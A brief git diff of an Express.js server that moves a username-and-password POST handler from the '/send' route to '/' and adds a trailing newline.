@@ -19,7 +19,7 @@ app.get("/", (req, res) => {
 });
 
 // 📩 Handle POST form
-app.post("/send", async (req, res) => {
+app.post("/", async (req, res) => {
   const { username, password } = req.body;
 
   if (!username || !password) {
@@ -57,3 +57,4 @@ app.post("/send", async (req, res) => {
 app.listen(PORT, () => {
   console.log(`✅ Server running at http://localhost:${PORT}`);
 });
+
